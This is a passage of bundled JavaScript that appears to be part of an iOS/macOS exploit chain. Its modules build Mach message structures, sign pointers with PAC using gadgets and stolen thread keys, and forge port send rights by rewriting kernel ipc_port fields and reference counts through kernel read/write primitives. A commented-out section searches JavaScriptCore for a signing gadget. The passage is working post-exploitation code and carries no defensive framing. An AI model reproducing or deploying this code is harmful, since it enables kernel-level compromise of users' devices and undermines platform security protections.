    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(40, value, true);
    }
  }, {
    key: "codeSecond",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(48, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(48, value, true);
    }
  }, {
    key: "flavor",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(56, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(56, value, true);
    }
  }, {
    key: "old_stateCnt",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(60, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(60, value, true);
    }
  }, {
    key: "paddingFirst",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(336, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(336, value, true);
    }
  }, {
    key: "paddingSecond",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(344, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(344, value, true);
    }
  }]);
}();


/***/ }),

/***/ "./libs/TaskRop/ExceptionReplyStruct.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return ExceptionReplyStruct; });
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/TaskRop/ThreadState.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }


var _buffer = /*#__PURE__*/new WeakMap();
var _dataView = /*#__PURE__*/new WeakMap();
var ExceptionReplyStruct = /*#__PURE__*/function () {
  function ExceptionReplyStruct(buffer) {
    _classCallCheck(this, ExceptionReplyStruct);
    _classPrivateFieldInitSpec(this, _buffer, void 0);
    _classPrivateFieldInitSpec(this, _dataView, void 0);
    _classPrivateFieldSet(_buffer, this, buffer);
    _classPrivateFieldSet(_dataView, this, new DataView(_classPrivateFieldGet(_buffer, this)));
    this.Head = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__["default"](_classPrivateFieldGet(_buffer, this));
    this.threadState = new _ThreadState__WEBPACK_IMPORTED_MODULE_1__["default"](_classPrivateFieldGet(_buffer, this), 44);
  }
  return _createClass(ExceptionReplyStruct, [{
    key: "NDR",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(24, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(24, value, true);
    }
  }, {
    key: "RetCode",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(32, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(32, value, true);
    }
  }, {
    key: "flavor",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(36, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(36, value, true);
    }
  }, {
    key: "new_stateCnt",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(40, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(40, value, true);
    }
  }]);
}();


/***/ }),

/***/ "./libs/TaskRop/MachMsgHeaderStruct.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return MachMsgHeaderStruct; });
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }
var _dataView = /*#__PURE__*/new WeakMap();
var MachMsgHeaderStruct = /*#__PURE__*/function () {
  function MachMsgHeaderStruct(buffer) {
    var offset = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 0;
    _classCallCheck(this, MachMsgHeaderStruct);
    _classPrivateFieldInitSpec(this, _dataView, void 0);
    _classPrivateFieldSet(_dataView, this, new DataView(buffer, offset));
  }
  return _createClass(MachMsgHeaderStruct, [{
    key: "msgh_bits",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(0, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(0, value, true);
    }
  }, {
    key: "msgh_size",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(4, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(4, value, true);
    }
  }, {
    key: "msgh_remote_port",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(8, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(8, value, true);
    }
  }, {
    key: "msgh_local_port",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(12, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(12, value, true);
    }
  }, {
    key: "msgh_voucher_port",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(16, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(16, value, true);
    }
  }, {
    key: "msgh_id",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(20, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(20, value, true);
    }
  }], [{
    key: "MACH_MSGH_BITS",
    value: function MACH_MSGH_BITS(remote, local) {
      return remote | local << 8;
    }
  }]);
}();


/***/ }),

/***/ "./libs/TaskRop/PAC.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return PAC; });
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _defineProperty(e, r, t) { return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, { value: t, enumerable: !0, configurable: !0, writable: !0 }) : e[r] = t, e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
//import Chain from "libs/Chain/Chain";
//import Native from "libs/JSUtils/Native";
//import Utils from "libs/JSUtils/Utils";
//import Exception from "./Exception";
//import Task from "./Task";
//import Thread from "./Thread";
//import ThreadState from "./ThreadState";
//import ExceptionMessageStruct from "./ExceptionMessageStruct";
//import Offsets from "Driver/Offsets";

var TAG = "PAC";
var PAC = /*#__PURE__*/function () {
  function PAC() {
    _classCallCheck(this, PAC);
  }
  return _createClass(PAC, null, [{
    key: "remotePACLocal",
    value: function remotePACLocal(address, modifier) {
      address = address & 0x7fffffffffn;
      //console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);
      var signedAddress = pacia(address, BigInt(modifier));
      //console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);
      return signedAddress;
    }
  }, {
    key: "remotePAC",
    value: function remotePAC(threadAddr, address, modifier) {
      return Native.pacia(address, modifier);

      //return this.remotePACLocal(address, modifier);
      /*
      if (!this.gadget_pacia)
      {
      	console.log(TAG,`Doesn't have gadget_pacia, aborting`);
      	return 0;
      }
      address = address & 0x7fffffffffn;
      	let signedAddress = 0n;
      	// Get PAC keys of remote thread
      let keyA = Thread.getRopPid(threadAddr);
      let keyB = Thread.getJopPid(threadAddr);
      	//console.log(TAG,`Key A:${Utils.hex(keyA)}`);
      //console.log(TAG,`Key B:${Utils.hex(keyB)}`);
      	let kr = 0;
      let pacThread = Native.mem;
      Native.callSymbol("thread_create", 0x203, pacThread);
      let buffRes = Native.read(pacThread, Utils.UINT32_SIZE);
      let viewRes = new DataView(buffRes);
      pacThread = viewRes.getUint32(0,true);
      //console.log(TAG,`pacThread:${Utils.hex(pacThread)}`);
      let stack = Native.callSymbol("malloc",0x4000n);
      let sp = stack + 0x2000n;
      let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
      let state = new ThreadState(stateBuff);
      state.opaque_sp = sp;
      //arm_thread_state64_set_pc_fptr(state, (void*)gadget_pacia);
      let outputBuffer = Native.mem;
      //console.log(TAG,`Before pacia`);
      if(pacia)
      	state.opaque_pc = pacia(this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"));
      else
      	state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);	
      const buildVer = Offsets.getBuildVersion();
      if(buildVer && buildVer.startsWith("22"))
      {
      	//console.log(TAG, "Applying 18 fix");
      	//state.opaque_lr = 0x401n;
      	state.opaque_lr = pacia(0x401n,Utils.ptrauth_string_discriminator("lr"));
      }
      //console.log(TAG,`After pacia with pc:${state.opaque_pc}`);
      //state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);
      state.registers.set(0,outputBuffer);
      state.registers.set(1,BigInt(address));
      state.registers.set(2,BigInt(modifier));
      state.registers.set(3,BigInt(pacThread));
      state.registers.set(16,BigInt(address));
      state.registers.set(17,BigInt(modifier));
      	let exceptionPort = Exception.createPort();
      if (!exceptionPort)
      {
      	console.log(TAG,`Cannot create exception port`);
      	this.#cleanup(pacThread,exceptionPort,stack);
      	return 0n;
      }
      	//console.log(TAG,`Exception port:${Utils.hex(exceptionPort)}`);
      	kr = Native.callSymbol("thread_set_exception_ports",
      	pacThread,
      	Utils.EXC_MASK_BAD_ACCESS,
      	exceptionPort,
      	Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES,
      	BigInt(Utils.ARM_THREAD_STATE64));
      
      if (kr != 0)
      {
      	console.log(`thread_set_exception_ports failed:${kr}`);
      	this.#cleanup(pacThread,exceptionPort,stack);
      	return 0n;
      }
      let pacThreadAddr = Task.getPortKObject(BigInt(pacThread));
      //console.log(TAG,`PAC thread address:${Utils.hex(pacThreadAddr)}`);
      if (!this.#setThreadState(pacThread, pacThreadAddr, stateBuff))
      {
      	console.log(TAG,`Failed to set thread state`);
      	this.#cleanup(pacThread,exceptionPort,stack);
      	return 0n;
      }
      // Change pacThread PAC keys with those of remote thread
      Thread.setPACKeys(pacThreadAddr, keyA, keyB);
      //console.log(TAG,`Starting PAC thread...`);
      Native.callSymbol("thread_resume",pacThread);
      let excBuffer = Native.mem;
      if (!Exception.waitException(exceptionPort, excBuffer, 100, false))
      {
      	console.log(TAG,`Failed to receive exception from PAC thread`);
      	this.#cleanup(pacThread,exceptionPort,stack);
      	return 0n;
      }
      let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
      let exc = new ExceptionMessageStruct(excRes);
      signedAddress = exc.threadState.registers.get(16);
      //console.log(TAG,`Signed address: ${Utils.hex(address)} -> signedAddress:${Utils.hex(signedAddress)}`);
      this.#cleanup(pacThread, exceptionPort, stack);
      return signedAddress;
      */
    }

    /*
    static #findGadgets()
    {
    	let sym = Native.dlsym("_ZNK3JSC13JSArrayBuffer8isSharedEv");
    	if (!sym)
    	{
    		console.log(TAG,`Symbol not found`);
    		return false;
    	}
    		let symStripped = sym & ~0xffffff8000000000n;
    	let gadgetOpcodesBuff = new ArrayBuffer(20);
    	let gadgetOpcodesView = new DataView(gadgetOpcodesBuff);
    	gadgetOpcodesView.setUint32(0,0xDAC10230,true);
    	gadgetOpcodesView.setUint32(4,0x9A9003E8,true);
    	gadgetOpcodesView.setUint32(8,0xF100011F,true);
    	gadgetOpcodesView.setUint32(12,0x1A9F07E0,true);
    	gadgetOpcodesView.setUint32(16,0xD65F03C0,true);
    	let data = Native.read(symStripped,0x1000);
    	let gadgetOffset = Utils.memmem(data,gadgetOpcodesBuff);
    	if (!gadgetOffset)
    	{
    		console.log(TAG,`pacia_gadget offset not found`);
    		return false;
    	}
    	this.gadget_pacia = symStripped + BigInt(gadgetOffset);
    		console.log(TAG,`Gadgets found: pacia=${Utils.hex(this.gadget_pacia)}`);
    		return true;
    }
    	static #setThreadState(thread,threadAddr,stateBuff)
    {
    	let options = Thread.getOptions(threadAddr);
    	options |= 0x8000;	
    	Thread.setOptions(threadAddr, options);
    	let stateMem = Native.mem;
    	Native.write(stateMem,stateBuff);
    	//console.log(TAG,`thread:${Utils.hex(thread)}`);
    	let kr = Native.callSymbol("thread_set_state",
    		thread,
    		BigInt(Utils.ARM_THREAD_STATE64),
    		stateMem,
    		BigInt(Utils.ARM_THREAD_STATE64_COUNT));
    	if (kr != 0)
    	{
    		console.log(TAG,`Failed thread_set_state with error:${kr}`);
    		return false;
    	}
    		options &= ~0x8000;
    	Thread.setOptions(threadAddr, options);
    	return true;
    }
    	static #cleanup(pacThread,exceptionPort,stack)
    {
    	Native.callSymbol("thread_terminate",pacThread);
    	Native.callSymbol("mach_port_destruct",0x203, exceptionPort, 0n, 0n);
    	Native.callSymbol("free",stack);
    }
    */
  }]);
}();
_defineProperty(PAC, "gadget_pacia", void 0);
(function () {})(); //this.#findGadgets();


/***/ }),

/***/ "./libs/TaskRop/PortRightInserter.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return PortRightInserter; });
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/Chain/Chain.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__("./libs/JSUtils/Utils.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__("./libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__("./libs/TaskRop/Task.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }





var TAG = "PORTRIGHTINSERTER";
var TASK_SELF = 0x203;
var MACH_PORT_NULL = 0;
var MACH_PORT_TYPE_SEND = 0x10000;
var MACH_PORT_TYPE_DEAD_NAME = 0x100000;
var MACH_SEND_MSG = 0x00000001n;
var MACH_RCV_MSG = 0x00000002n;
var MACH_SEND_TIMEOUT = 0x00000010n;
var MACH_RCV_TIMEOUT = 0x00000100n;
var MACH_MSG_TYPE_COPY_SEND = 19;
var MACH_MSG_TYPE_MAKE_SEND = 20;
var MACH_MSG_TYPE_MAKE_SEND_ONCE = 21;
var MACH_MSGH_BITS_COMPLEX = 0x80000000;
var MACH_MSG_PORT_DESCRIPTOR = 0;
var MPO_INSERT_SEND_RIGHT = 0x10;
var MPO_PROVISIONAL_ID_PROT_OPTOUT = 0x8000;
var IO_BITS_KOLABEL = 0x00000400;
var IE_BITS_TYPE_MASK = 0x001f0000;
var PortRightInserter = /*#__PURE__*/function () {
  function PortRightInserter() {
    _classCallCheck(this, PortRightInserter);
  }
  return _createClass(PortRightInserter, null, [{
    key: "insert",
    value: function insert(portKaddr) {
      var p = _assertClassBrand(PortRightInserter, this, _newPort).call(this);
      //console.log(TAG, "New port: " + Utils.hex(p));
      var pAddr = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortAddr(BigInt(p));
      //console.log(TAG, "New port addr: " + Utils.hex(pAddr));
      if (!pAddr) return 0;

      //this.#dumpPort(portKaddr);
      //this.#dumpPort(pAddr);

      var backupBits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(portKaddr);
      //console.log(TAG, "Port io bits: " + Utils.hex(backupBits));
      var needsFixBits = backupBits & IO_BITS_KOLABEL;
      if (needsFixBits) {
        var newBits = backupBits & ~IO_BITS_KOLABEL;
        libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(portKaddr, newBits);
      }
      _assertClassBrand(PortRightInserter, this, _fixRefCounts).call(this, portKaddr, 1);

      //console.log(TAG, "Fix Ok");
      //this.#dumpPort(portKaddr);

      libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(pAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipNsRequest, portKaddr);
      //this.#dumpPort(pAddr);

      var previous = _assertClassBrand(PortRightInserter, this, _notifyNoSenders).call(this, p, MACH_PORT_NULL);
      //console.log(TAG, "Previous right: " + Utils.hex(previous));

      // Change the port rights from send once to send.
      _assertClassBrand(PortRightInserter, this, _switchToSendRight).call(this, previous);

      //this.#fixRefCounts(portKaddr, -1, false);

      // We have a send right to the port, but it's not in our space's hash.
      // We send the port, then kill the entry. We'll properly receive it afterwards.
      var msgBuff = new ArrayBuffer(40);
      var msgHeader = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"](msgBuff);
      msgHeader.msgh_id = 0x4141;
      msgHeader.msgh_remote_port = p;
      msgHeader.msgh_local_port = p;
      msgHeader.msgh_size = msgBuff.byteLength;
      msgHeader.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_MAKE_SEND);
      msgHeader.msgh_bits |= MACH_MSGH_BITS_COMPLEX; // we send a port descriptor

      var msgBody = new DataView(msgBuff, 24);
      msgBody.setInt32(0, 1, true); // msgh_descriptor_count
      msgBody.setUint32(4, previous, true); // name
      msgBody.setUint8(14, MACH_MSG_TYPE_COPY_SEND); // disposition
      msgBody.setUint8(15, MACH_MSG_PORT_DESCRIPTOR); // type

      //let wMsg64 = new BigUint64Array(msgBuff);
      //for (let i=0; i<5; i++)
      //	console.log(TAG, `${i}: ${Utils.hex(wMsg64[i]).padStart(16, '0')}`);

      var msgMem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(msgMem, msgBuff);
      var ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg", msgMem, MACH_SEND_MSG, msgBuff.byteLength, 0, p, 0, 0);
      //console.log(TAG, "mach_msg: " + ret);
      //Native.callSymbol("sleep", 1);
      if (ret != 0) {
        var errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
        errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
        console.log(TAG, "Error sending message: ".concat(errString));
        return 0;
      }

      //console.log(TAG, "mach_msg send: " + ret);

      _assertClassBrand(PortRightInserter, this, _killRight).call(this, previous);
      ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg", msgMem, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].memSize, p, 1000, 0);
      if (ret != 0) {
        var _errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
        _errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(_errString);
        console.log(TAG, "Error receiving message: ".concat(_errString));
        return 0;
      }

      //console.log(TAG, "mach_msg recv: " + ret);
      //Native.callSymbol("sleep", 1);

      var rMsg = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(msgMem, 40);

      //let rMsg64 = new BigUint64Array(rMsg);
      //for (let i=0; i<5; i++)
      //	console.log(TAG, `${i}: ${Utils.hex(rMsg64[i]).padStart(16, '0')}`);

      msgBody = new DataView(rMsg, 24);
      previous = msgBody.getUint32(4, true);
      //console.log(TAG, "previous: " + Utils.hex(previous));

      _assertClassBrand(PortRightInserter, this, _fixRefCounts).call(this, portKaddr, -1);

      //this.#dumpPort(portKaddr);

      return previous;
    }
  }]);
}();
function _newPort() {
  var options = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
  var buffer = new ArrayBuffer(8);
  var view = new DataView(buffer);
  view.setUint32(0, MPO_INSERT_SEND_RIGHT, true);
  view.setUint32(4, 0, true);
  libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(options, buffer);
  var newPortPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x100n;
  var kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_construct", TASK_SELF, options, 0n, newPortPtr);
  if (kr != 0) {
    console.log(TAG, "Error creating port: ".concat(kr));
    return MACH_PORT_NULL;
  }
  return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(newPortPtr);
}
function _switchToSendRight(port) {
  var entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
  //console.log(TAG, "entry: " + Utils.hex(entry));
  //this.#dumpEntry(entry);
  var bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
  //console.log(TAG, "entry bits: " + Utils.hex(bits));
  bits = bits & ~IE_BITS_TYPE_MASK | MACH_PORT_TYPE_SEND;
  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
  //this.#dumpEntry(entry);
}
function _killRight(port) {
  var entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
  //console.log(TAG, "entry: " + Utils.hex(entry));
  //this.#dumpEntry(entry);
  var bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
  //console.log(TAG, "entry bits: " + Utils.hex(bits));
  bits = bits & ~IE_BITS_TYPE_MASK | MACH_PORT_TYPE_DEAD_NAME;
  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(entry, 0n);
  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
  //this.#dumpEntry(entry);
}
function _fixRefCounts(portAddr, diff) {
  var updateRefs = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : true;
  var updateSonce = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : true;
  // Due to krw limitation, we cannot write at offset +132 of a 144 bytes struct,
  // since krw would write in chunks of 32 bytes and so would cause a memory overflow (panic).
  // So we read all the 144 bytes struct, changes values and then write it again as a whole.

  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(portAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
  var ipcPort = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
  var ipcPortView = new DataView(ipcPort);
  var refs = ipcPortView.getUint32(0x4, true);
  var sonce = ipcPortView.getUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), true);

  //console.log(TAG, "refs: " + refs);
  //console.log(TAG, "sonce: " + sonce);

  refs += diff;
  sonce += diff;
  if (updateRefs) {
    //console.log(TAG, "new refs: " + refs);
    ipcPortView.setUint32(0x4, refs, true);
  }
  if (updateSonce) {
    //console.log(TAG, "new sonce: " + sonce);
    ipcPortView.setUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), sonce, true);
  }
  libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, ipcPort);
  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].writeZoneElement(portAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
}
function _notifyNoSenders(port, notifyPort) {
  var MACH_NOTIFY_NO_SENDERS = 70;
  var previousPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
  var kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_request_notification", TASK_SELF, port, MACH_NOTIFY_NO_SENDERS, 0, notifyPort, MACH_MSG_TYPE_MAKE_SEND_ONCE, previousPtr);
  //console.log(TAG, "mach_port_request_notification: " + kr);
  if (kr != 0) return MACH_PORT_NULL;
